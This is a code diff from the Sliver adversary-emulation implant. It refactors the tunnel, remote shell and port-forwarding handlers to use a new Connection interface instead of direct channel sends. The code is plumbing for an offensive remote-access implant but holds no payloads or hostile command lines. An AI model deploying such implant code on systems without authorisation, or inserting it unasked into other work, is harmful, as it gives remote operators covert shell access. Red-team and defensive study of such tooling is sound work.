@@ -33,6 +33,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/shell"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	"google.golang.org/protobuf/proto"
 )
@@ -54,6 +55,19 @@ var (
 	tunnelDataCache = map[uint64]map[uint64]*sliverpb.TunnelData{}
 )
 
+// Connection - A connection object that can support read-write operations
+type Connection interface {
+	// Request
+	RequestRecv() chan *pb.Envelope
+	RequestSend(*pb.Envelope)
+	RequestResend([]byte)
+
+	// Tunneling
+	Tunnel(ID uint64) *transports.Tunnel
+	AddTunnel(*transports.Tunnel)
+	RemoveTunnel(ID uint64)
+}
+
 // GetTunnelHandlers - Returns a map of tunnel handlers
 func GetTunnelHandlers() map[uint32]TunnelHandler {
 	// {{if .Config.Debug}}
@@ -62,7 +76,7 @@ func GetTunnelHandlers() map[uint32]TunnelHandler {
 	return tunnelHandlers
 }
 
-func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func tunnelCloseHandler(envelope *sliverpb.Envelope, connection Connection) {
 	tunnelClose := &sliverpb.TunnelData{
 		Closed: true,
 	}
@@ -81,7 +95,7 @@ func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Conn
 	}
 }
 
-func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func tunnelDataHandler(envelope *sliverpb.Envelope, connection Connection) {
 	tunnelData := &sliverpb.TunnelData{}
 	proto.Unmarshal(envelope.Data, tunnelData)
 	tunnel := connection.Tunnel(tunnelData.TunnelID)
@@ -161,7 +175,7 @@ func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 // I know the reader/writer stuff is a little hard to keep track of
 type tunnelWriter struct {
 	tun  *transports.Tunnel
-	conn *transports.Connection
+	conn Connection
 }
 
 func (tw tunnelWriter) Write(data []byte) (int, error) {
@@ -176,14 +190,14 @@ func (tw tunnelWriter) Write(data []byte) (int, error) {
 	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d", n, tw.tun.WriteSequence, tw.tun.ReadSequence)
 	// {{end}}
 	tw.tun.WriteSequence++ // Increment write sequence
-	tw.conn.Send <- &sliverpb.Envelope{
+	tw.conn.RequestSend(&sliverpb.Envelope{
 		Type: sliverpb.MsgTunnelData,
 		Data: data,
-	}
+	})
 	return n, err
 }
 
-func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func shellReqHandler(envelope *sliverpb.Envelope, connection Connection) {
 
 	shellReq := &sliverpb.ShellReq{}
 	err := proto.Unmarshal(envelope.Data, shellReq)
@@ -226,10 +240,10 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		Path:     shellReq.Path,
 		TunnelID: shellReq.TunnelID,
 	})
-	connection.Send <- &sliverpb.Envelope{
+	connection.RequestSend(&sliverpb.Envelope{
 		ID:   envelope.ID,
 		Data: shellResp,
-	}
+	})
 
 	// Cleanup function with arguments
 	cleanup := func(reason string) {
@@ -241,10 +255,10 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 			Closed:   true,
 			TunnelID: tunnel.ID,
 		})
-		connection.Send <- &sliverpb.Envelope{
+		connection.RequestSend(&sliverpb.Envelope{
 			Type: sliverpb.MsgTunnelClose,
 			Data: tunnelClose,
-		}
+		})
 	}
 
 	go func() {
@@ -273,7 +287,7 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 
 }
 
-func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func portfwdReqHandler(envelope *sliverpb.Envelope, connection Connection) {
 	portfwdReq := &sliverpb.PortfwdReq{}
 	err := proto.Unmarshal(envelope.Data, portfwdReq)
 	if err != nil {
@@ -321,10 +335,10 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 		Protocol: sliverpb.PortFwdProtoTCP,
 		TunnelID: portfwdReq.TunnelID,
 	})
-	connection.Send <- &sliverpb.Envelope{
+	connection.RequestSend(&sliverpb.Envelope{
 		ID:   envelope.ID,
 		Data: portfwdResp,
-	}
+	})
 
 	cleanup := func(reason error) {
 		// {{if .Config.Debug}}
@@ -335,10 +349,10 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 			Closed:   true,
 			TunnelID: tunnel.ID,
 		})
-		connection.Send <- &sliverpb.Envelope{
+		connection.RequestSend(&sliverpb.Envelope{
 			Type: sliverpb.MsgTunnelClose,
 			Data: tunnelClose,
-		}
+		})
 	}
 
 	go func() {
